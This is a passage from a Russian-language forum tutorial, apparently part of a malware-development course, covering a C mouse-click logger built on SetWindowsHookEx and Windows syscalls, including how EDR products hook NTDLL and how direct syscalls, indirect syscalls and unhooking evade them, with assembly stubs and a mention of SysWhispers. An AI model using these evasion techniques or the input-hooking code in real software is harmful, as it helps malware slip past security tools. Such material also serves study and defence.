	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef LRESULT (CALLBACK* HOOKPROC)(int nCode, WPARAM wParam, LPARAM lParam);</code></pre>
	</div>
</div><br />
Таким образом, функция обратного вызова должна быть определена, как функция ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
  // код функции
}</code></pre>
	</div>
</div><br />
Функция обратного вызова также должна использовать WinAPI CallNextHookEx и возвращать его результат. CallNextHookEx передает информацию о перехвате следующей процедуре перехвата в цепочке перехватов. Другими словами, он передаст информацию о перехвате функции обратного вызова в следующий раз, когда она будет выполнена.<br />
<br />
Функция обратного вызова обновлена, чтобы включать в себя CallNextHookEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
  // Код функции

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}</code></pre>
	</div>
</div><br />
На основании замечаний Microsoft вызов CallNextHookEx является необязательным, но настоятельно рекомендуется. В противном случае другие приложения, которые установили перехваты, не будут получать уведомления о перехватах и могут работать неправильно.<br />
<br />
И наконец, последняя часть - код функции обратного вызова. Код будет отслеживать действие, поэтому в этом примере функция проверяет, какая кнопка мыши была нажата с помощью следующего кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] Левый клик мыши \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] Правый клик мыши \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] Средний клик мыши \n&quot;);
    }

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}</code></pre>
	</div>
</div><br />
<b>Обработка сообщений</b><br />
<br />
Получив код, необходимый для отслеживания кликов пользователя мышью, следующий шаг - убедиться, что процесс перехвата поддерживается. Это достигается путем выполнения кода мониторинга в течение определенного периода. Для этого SetWindowsHookExW вызывается внутри потока, который остается активным на желаемый промежуток времени с использованием WinAPI WaitForSingleObject.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Функция обратного вызова, которая будет выполняться каждый раз, когда пользователь кликает кнопкой мыши
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] Левый клик мыши \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] Правый клик мыши \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] Средний клик мыши \n&quot;);
    }

    // переход к следующему перехвату в цепочке перехватов
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){

    // Установка перехвата
    HHOOK hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,
        NULL
    );
    if (!hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW не удалось с ошибкой : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Поддержание работы потока
    while(1){

    }

    return TRUE;
}


int main() {

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Отслеживание кликов мыши в течение 10 секунд

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Улучшение реализации</b><br />
<br />
Проблема с предыдущим кодом заключалась в том, что цикл while не обрабатывает сообщения перехваченной мыши, что приводило к задержке движения мыши на целевой машине. Чтобы решить эту проблему, необходимо обрабатывать все события сообщений с помощью DefWindowProc. Это обеспечит правильную обработку события системой и выполнение соответствующего поведения по умолчанию. DefWindowProcW вызывает стандартную процедуру окна для предоставления стандартной обработки любых сообщений окна, которые приложение не обрабатывает.<br />
<br />
Чтобы получить детали сообщения, сначала должен быть вызван GetMessageW, который извлекает сообщение из очереди сообщений вызывающего потока. Затем это сообщение передается DefWindowProcW, который обрабатывает его. GetMessageW возвращает информацию о сообщении в структуре MSG, которая включает все, что необходимо для следующего вызова DefWindowProcW.<br />
<br />
Все это должно выполняться в цикле, чтобы гарантировать ручную обработку каждого необработанного сообщения.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Функция обратного вызова, которая будет выполняться каждый раз, когда пользователь кликнет кнопкой мыши
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] Левый клик мыши \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] Правый клик мыши \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] Средний клик мыши \n&quot;);
    }

    // Переход к следующему перехвату в цепочке перехватов
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){

    MSG         Msg         = { 0 };

    // Установка перехвата
    HHOOK hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,
        NULL
    );
    if (!hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW не удалось с ошибкой : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Обработка необработанных событий
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


int main() {

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Отслеживание кликов мыши в течение 10 секунд

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Удаление перехватов</b><br />
<br />
Чтобы удалить любой перехват, установленный функцией SetWindowsHookEx, должен быть вызван WinAPI UnhookWindowsHookEx.<br />
UnhookWindowsHookEx принимает только дескриптор перехвата для удаления.<br />
<br />
<b>Код перехвата SetWindowsHookEx </b><br />
<br />
Приведенный ниже фрагмент кода соединяет все, что обсуждалось в этом модуле, чтобы выполнить перехват событий клика мыши, а затем удаляет перехват.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Глобальная переменная дескриптора перехвата
HHOOK g_hMouseHook      = NULL;

// Функция обратного вызова, которая будет выполняться каждый раз, когда пользователь кликнет кнопкой мыши
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] Левый клик мыши \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] Правый клик мыши \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] Средний клик мыши \n&quot;);
    }

    // Переход к следующему перехвату в цепочке перехватов
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){

    MSG         Msg         = { 0 };

    // Установка перехвата
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW не удалось с ошибкой : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Обработка необработанных событий
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


int main() {

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Отслеживание кликов мыши в течение 10 секунд

    // Отключение перехвата
    if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
        printf(&quot;[!] UnhookWindowsHookEx не удалось с ошибкой : %d \n&quot;, GetLastError());
    }
    return 0;
}</code></pre>
	</div>
</div></div>
						

							<h2>Предельная техника. Разборка с сисколами</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746785345003.png"
		data-src="https://osint42.org/attachments/1746785345003-png.197/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785345003-png.197/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785345003.png"
			title="1746785345003.png"
			width="300" height="300" loading="lazy" />
	</div><br />
<br />
<b>Что такое системные вызовы (Syscalls)</b><br />
<br />
Системные вызовы Windows или syscalls служат интерфейсом для взаимодействия программ с системой, позволяя им запрашивать определенные услуги, такие как чтение или запись в файл, создание нового процесса или выделение памяти.<br />
<br />
Помните из вводных модулей, что syscalls - это API, которые выполняют действия, когда вызывается функция WinAPI. Например, системный вызов NtAllocateVirtualMemory активируется при вызове функций WinAPI VirtualAlloc или VirtualAllocEx. Затем этот системный вызов перемещает параметры, предоставленные пользователем в предыдущем вызове функции, в ядро Windows, выполняет запрошенное действие и возвращает результат программе.<br />
<br />
Все системные вызовы возвращают значение NTSTATUS, которое указывает код ошибки. STATUS_SUCCESS (ноль) возвращается, если системный вызов успешно выполняет операцию.<br />
<br />
Большинство системных вызовов не документированы Microsoft, поэтому модули syscall будут ссылаться на приведенную ниже документацию.<br />
<br />
<div><a href="http://undocumented.ntinternals.net/" target="_blank" class="link link--external" rel="noopener">http://undocumented.ntinternals.net/</a></div><br />
<div><a href="https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html" target="_blank" class="link link--external" rel="noopener">https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html</a></div><br />
<b>Большинство системных вызовов экспортируется из DLL ntdll.dll.<br />
<br />
Почему нужно использовать Syscalls</b><br />
<br />
Использование системных вызовов обеспечивает низкоуровневый доступ к операционной системе, что может быть полезно для выполнения действий, которые недоступны или сложнее выполнять с помощью стандартных WinAPI. Например, системный вызов NtCreateUserProcess предоставляет дополнительные опции при создании процессов, которые WinAPI CreateProcess не может.<br />
<br />
Кроме того, системные вызовы могут быть использованы для обхода хостовых решений по безопасности, о чем будет рассказано в этой статье.<br />
<br />
<b>Системные вызовы Zw против Nt</b><br />
<br />
Существует два типа системных вызовов: те, что начинаются с Nt, и другие с Zw.<br />
<br />
Системные вызовы NT - это основной интерфейс для программ в режиме пользователя. Это системные вызовы, которые обычно используют большинство программ Windows.<br />
<br />
Системные вызовы Zw, с другой стороны, представляют собой низкоуровневый интерфейс в режиме ядра к операционной системе. Они обычно используются драйверами устройств и другим кодом в режиме ядра, которому требуется прямой доступ к функциональности операционной системы.<br />
<br />
<b>Подводя итог,</b> системные вызовы Zw используются в режиме ядра <b>при разработке драйверов устройств</b>, в то время как системные вызовы Nt выполняются <b>из программ в режиме пользователя.</b> Хотя возможно использовать оба из программ в режиме пользователя и все равно получить одинаковый результат. Это можно заметить на приведенных ниже изображениях, где обе версии одного и того же системного вызова имеют один и тот же адрес функции.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785359165.png"
		data-src="https://osint42.org/attachments/1746785359165-png.198/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785359165-png.198/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785359165.png"
			title="1746785359165.png"
			width="659" height="122" loading="lazy" />
	</div><br />
<br />
Для простоты в этом курсе будут использоваться только системные вызовы Nt.<br />
<br />
<b>Номер службы системного вызова</b><br />
<br />
У каждого системного вызова есть специальный номер системного вызова, который известен как номер системной службы или SSN. Эти номера системных вызовов используются ядром для различения системных вызовов между собой. Например, у системного вызова NtAllocateVirtualMemory будет SSN равный 24, тогда как у NtProtectVirtualMemory будет SSN равный 80, эти номера используются ядром для различения NtAllocateVirtualMemory от NtProtectVirtualMemory.<br />
<br />
<b>Разные SSN в зависимости от ОС</b><br />
<br />
Важно знать, что SSN будут различаться в зависимости от ОС (например, Windows 10 против 11) и внутри самой версии (например, Windows 11 21h2 против Windows 11 22h2). Используя вышеупомянутый пример, NtAllocateVirtualMemory может иметь SSN равный 24 в одной версии Windows, тогда как в другой версии он будет 34. То же самое относится к NtProtectVirtualMemory, а также ко всем остальным системным вызовам.<br />
<br />
<b>Системные вызовы в памяти </b><br />
<br />
Внутри машины SSN не являются абсолютно произвольными и имеют отношение друг к другу. Каждый номер системного вызова в памяти равен предыдущему SSN + 1. Например, SSN системного вызова B равен SSN системного вызова A плюс один. Это также верно, когда подходите к системному вызову с другой стороны, где SSN системного вызова C будет тем из системного вызова D минус один.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785367168.png"
		data-src="https://osint42.org/attachments/1746785367168-png.199/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785367168-png.199/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785367168.png"
			title="1746785367168.png"
			width="1134" height="782" loading="lazy" />
	</div><br />
<br />
Это отношение показано на следующем изображении, где SSN ZwAxxessCheck равен 0, а SSN следующего системного вызова, NtWorkerFactoryWorkerReady, равен 1 и так далее.<br />
<br />
Понимание того, что системные вызовы имеют отношение друг к другу, пригодится для обхода систем безопасности далее.<br />
<br />
<b>Структура системного вызова</b><br />
<br />
Структура системного вызова, как правило, одинакова и будет выглядеть как показанный ниже фрагмент.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>mov r10, rcx
mov eax, SSN
syscall</code></pre>
	</div>
</div><br />
Например, NtAllocateVirtualMemory на 64-битной системе показан ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785378881.png"
		data-src="https://osint42.org/attachments/1746785378881-png.200/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785378881-png.200/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785378881.png"
			title="1746785378881.png"
			width="1419" height="114" loading="lazy" />
	</div><br />
<br />
И NtProtectVirtualMemory в качестве примера<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785384886.png"
		data-src="https://osint42.org/attachments/1746785384886-png.201/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785384886-png.201/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785384886.png"
			title="1746785384886.png"
			width="1404" height="114" loading="lazy" />
	</div><br />
<br />
<b>Объяснение инструкций системного вызова</b><br />
<br />
Первая строка системного вызова перемещает первое значение параметра, сохраненное в RCX, в регистр R10. Затем SSN системного вызова перемещается в регистр EAX. Наконец, выполняется специальная инструкция системного вызова.<br />
<br />
<b>Инструкции syscall на 64-битных системах или sysenter на 32-битных системах </b>- это инструкции, которые инициируют системный вызов. Выполнение инструкции syscall приведет к тому, что программа передаст управление из режима пользователя в режим ядра. Затем ядро выполнит запрошенное действие и вернет управление программе в режиме пользователя по завершении.<br />
<br />
<b>Инструкции Test &amp; Jne</b><br />
<br />
Инструкции test и jne предназначены для целей WoW64, которые позволяют 32-битным процессам работать на 64-битной машине. Эти инструкции не влияют на поток выполнения, когда процесс является 64-битным процессом.<br />
<br />
<b>Не все NtAPI являются системными вызовами </b><br />
<br />
Важно отметить, что хотя некоторые NtAPI возвращают NTSTATUS, они не обязательно являются системными вызовами. Эти NtAPI могут быть вместо этого функциями более низкого уровня, которые используются WinAPI или системными вызовами. Причина, по которой некоторые NtAPI не классифицируются как системные вызовы, заключается в их несоответствии структуре системного вызова, например, отсутствии номера системного вызова или отсутствии обычной инструкции mov r10, rcx в начале. Пример NtAPI, которые не являются системными вызовами, показан ниже.<br />
<br />
LdrLoadDll - Это используется LoadLibrary WinAPI для загрузки образа в вызывающий процесс.<br />
<br />
SystemFunction032 и SystemFunction033 - Эти NtAPI были представлены ранее и выполняют операции шифрования/дешифрования RC4.<br />
<br />
RtlCreateProcessParametersEx - Это используется CreateProcess WinAPI для создания аргументов процесса.<br />
<br />
Инструкции LdrLoadDll показаны ниже. Обратите внимание, как оно не соответствует типичной структуре системного вызова.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785404597.png"
		data-src="https://osint42.org/attachments/1746785404597-png.202/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785404597-png.202/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785404597.png"
			title="1746785404597.png"
			width="1523" height="441" loading="lazy" />
	</div><br />
<br />
<b>Syscalls - Перехват в пользовательском режиме<br />
<br />
Введение</b><br />
<br />
Решения по безопасности на стороне хоста часто используют перехват API на системных вызовах для анализа и мониторинга программ в реальном времени. Например, перехватывая системный вызов NtProtectVirtualMemory, решение безопасности может обнаружить более высокоуровневые вызовы WinAPI, такие как VirtualProtect, <b>даже если они скрыты от таблицы адресов импорта бинарного файла.</b> Кроме того, решения безопасности могут получить доступ к любому участку памяти, установленному как исполняемый, и сканировать его в поисках сигнатур. Перехватчики в пользовательском режиме обычно устанавливаются перед инструкцией системного вызова, которая является последним шагом для функции системного вызова в пользовательском режиме.<br />
<br />
Перехватчики в режиме ядра могут быть реализованы после выполнения, <b>после передачи управления ядру.</b> Однако Windows Patch Guard и другие средства защиты делают сложной или даже невозможной задачу изменения памяти ядра сторонними приложениями. Установка перехватчиков в режиме ядра может также привести к проблемам стабильности и вызвать неожиданное поведение, <b><u>поэтому она редко используется.</u><br />
<br />
Пример подключения в пользовательском режиме</b><br />
<br />
В этом разделе используется файл DLL, который при внедрении в процесс использует библиотеку Minhook для установки перехвата на NtProtectVirtualMemory с целью получения информации о действиях EDR относительно перехвата системного вызова. Установленный перехватчик обладает возможностью вывода содержимого памяти на экран в консоль, если он установлен как исполняемый (RX или RWX). Кроме того, процесс будет завершен, если обнаружена область памяти RWX.<br />
<br />
<b>Демонстрация перехвата EDR<br />
<br />
<span style="color: rgb(184, 49, 47)">Это просто демонстрация, как перехват NtProtectVirtualMemory может защитить от инъекции, код пока не приводится.<br />
Рекомендую потренироваться самому.<br />
Как устанавливать перехват можно почитать здесь:Кунгфу-2.Изучаем API Hooking | Цикл статей &quot;Изучение вредоносных программ&quot;</span></b><br />
<br />
Этот раздел демонстрирует, как EDR может блокировать выполнение определенного полезного кода с помощью перехвата системного вызова. В этой демонстрации вредоносным бинарным файлом будет код внедрения APC (Изучаем технику APC Injection).<br />
<br />
Запуск программы без перехвата NtProtectVirtualMemory.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785418328.png"
		data-src="https://osint42.org/attachments/1746785418328-png.203/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785418328-png.203/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785418328.png"
			title="1746785418328.png"
			width="1283" height="487" loading="lazy" />
	</div><br />
<br />
Внедрение MalDevEdr.dll в ApcInjection.exe, с использованием Process Hacker. <b>В MalDevEdr.dll установлен перехватчик NtProtectVirtualMemor</b>y.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785501313.png"
		data-src="https://osint42.org/attachments/1746785501313-png.204/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785501313-png.204/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785501313.png"
			title="1746785501313.png"
			width="1323" height="573" loading="lazy" />
	</div><br />
<br />
DLL внедрена, и она обнаруживает RX (это связано с внедрением DLL).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785508015.png"
		data-src="https://osint42.org/attachments/1746785508015-png.205/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785508015-png.205/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785508015.png"
			title="1746785508015.png"
			width="1434" height="635" loading="lazy" />
	</div><br />
<br />
При нажатии клавиши Enter в консоли ApcInjection.exe вызывается NtProtectVirtualMemory, устанавливая 0x0000025041080000 как память RWX, этот адрес памяти затем выводится на экран в консоль.<br />
<br />
Выведенное содержимое - это полезная нагрузка Msfvenom calc.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785515399.png"
		data-src="https://osint42.org/attachments/1746785515399-png.206/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785515399-png.206/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785515399.png"
			title="1746785515399.png"
			width="1129" height="828" loading="lazy" />
	</div><br />
<br />
<b>Объяснение</b><br />
<br />
Когда ApcInjection.exe использует VirtualProtect с аргументом PAGE_EXECUTE_READWRITE, он перехватывается MalDevEdr.dll. MalDevEdr.dll будет использовать базовый адрес, переданный VirtualProtect, для сброса содержимого этой области памяти. Так как область памяти изменяется на RWX, MalDevEdr.dll завершает программу и блокирует выполнение полезной нагрузки, чего не смог сделать Windows Defender Antivirus.<br />
<br />
<b>Этот концептуальный пример демонстрирует мощь перехвата API в обнаружении и мониторинге программы в реальном времени.</b> В реальных условиях EDR обычно перехватывает более широкий диапазон системных вызовов, улучшая свою способность обнаруживать вредоносные действия.<br />
<br />
<b>Обход перехватчиков системных вызовов в пользовательском режиме<br />
<br />
Использование системных вызовов напрямую</b> является одним из способов обхода перехватчиков в пользовательском режиме. Например, использование NtAllocateVirtualMemory вместо VirtualAlloc/Ex WinAPI при выделении памяти для полезной нагрузки. Есть несколько других способов, которыми системные вызовы могут быть вызваны незаметно:<br />
<br />
Использование прямых системных вызовов.<br />
Использование косвенных системных вызовов.<br />
Снятие перехвата.<br />
<br />
<b>Прямые системные вызовы</b><br />
<br />
Обход перехвата системных вызовов в пользовательском режиме можно достичь, получив версию функции системного вызова, записанную на языке ассемблера, и вызвав этот созданный системный вызов напрямую из файла ассемблера. Задача заключается в определении номера службы системного вызова (SSN), так как этот номер меняется от одной системы к другой. Чтобы преодолеть это, SSN может быть либо жестко закодирован в файле ассемблера, либо вычислен динамически во время выполнения.<br />
<br />
Образец созданного системного вызова в файле ассемблера (.asm) представлен ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtAllocateVirtualMemory)
    syscall
    ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtProtectVirtualMemory)
    syscall
    ret
NtProtectVirtualMemory ENDP

// другие системные вызовы...</code></pre>
	</div>
</div><br />
Вместо вызова NtAllocateVirtualMemory с использованием GetProcAddress и GetModuleHandle, как это было сделано ранее в этом курсе, нижеследующую функцию ассемблера можно использовать для получения того же результата. Это исключает необходимость вызывать NtAllocateVirtualMemory из адресного пространства NTDLL, где установлены перехватчики, тем самым избегая этих перехватчиков.<br />
<br />
Этот метод используется в инструментах, таких как <a href="https://github.com/jthuraisamy/SysWhispers" target="_blank" class="link link--external" rel="noopener">SysWhispers</a> и <a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener">HellsGate</a>, обсуждение которых будет позже в этой статье.<br />
<br />
<b>Косвенные системные вызовы</b><br />
<br />
Косвенные системные вызовы реализуются аналогично прямым системным вызовам, где файлы на языке ассемблера должны быть созданы вручную. Различие заключается в отсутствии инструкции системного вызова внутри функции на языке ассемблера, к которой вместо этого происходит переход.<br />
<br />
Визуальное представление представлено ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785533317.png"
		data-src="https://osint42.org/attachments/1746785533317-png.207/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785533317-png.207/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785533317.png"
			title="1746785533317.png"
			width="1263" height="657" loading="lazy" />
	</div><br />
<br />
Функции на языке ассемблера для NtAllocateVirtualMemory и NtProtectVirtualMemory представлены ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtAllocateVirtualMemory)
    jmp (address of a syscall instruction)
    ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtProtectVirtualMemory)
    jmp (address of a syscall instruction)
    ret
NtProtectVirtualMemory ENDP

// другие системные вызовы...</code></pre>
	</div>
</div><br />
<b>Преимущества косвенных системных вызовов</b><br />
<br />
Преимущество выполнения косвенных системных вызовов перед прямыми системными вызовами заключается в том, что решения безопасности будут искать системные вызовы, вызываемые из-за пределов адресного пространства NTDLL, и считать их подозрительными. С косвенными системными вызовами инструкция системного вызова выполняется из адресного пространства NTDLL, как это должно быть у нормальных системных вызовов. Поэтому косвенные системные вызовы более вероятно пройдут мимо решений безопасности, чем прямые системные вызовы.<br />
<br />
<b>Снятие перехвата</b><br />
<br />
Снятие перехвата - это еще один способ обхода перехватчиков, при котором перехваченная библиотека NTDLL, загруженная в память, заменяется на версию без перехвата. Неперехваченная версия может быть получена из нескольких мест, <b>но одним из общих подходов является ее загрузка непосредственно с диска. </b>Таким образом, удаляются все перехватчики, размещенные в библиотеке NTDLL.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785542013.png"
		data-src="https://osint42.org/attachments/1746785542013-png.208/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785542013-png.208/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785542013.png"
			title="1746785542013.png"
			width="1307" height="713" loading="lazy" />
	</div><br />
<br />
<br />
<b>Прямой вызов системных вызовов при помощи</b> <a href="https://github.com/jthuraisamy/SysWhispers" target="_blank" class="link link--external" rel="noopener"><b>SysWhispers</b></a><br />
<br />
<b>Введение</b><br />
<br />
SysWhispers - это инструмент на питоне, который генерирует код на си и ассемблере, который позволяет обойти перехват системных вызовов через прямые системные вызовы. Существует несколько версий SysWhispers, имеющих разные функции. Различия между версиями будут рассмотрены в этом модуле.<br />
<br />
<b>SysWhispers: </b><br />
<br />
SysWhispers создает заголовочные/ASM файлы имплантов для активации прямых системных вызовов на 64-битных системах. Он поддерживает системные вызовы от Windows XP до Windows 10 19042 (20H2). Поддерживаемые версии Windows ограничены, поскольку номер системного вызова (SSN) может изменяться с каждым обновлением Windows. Таким образом, прямая реализация системного вызова для конкретного системного вызова на Windows 10 1903 может быть несовместима с тем же системным вызовом на Windows 10 1909 и наоборот.<br />
<br />
Поскольку одни и те же системные вызовы могут иметь разные SSN на разных версиях Windows, SysWhispers проверяет версию Windows целевой системы во время выполнения и вручную устанавливает SSN для соответствующей версии.<br />
<br />
<b>SysWhispers - Пример NtMapViewOfSection:</b><br />
<br />
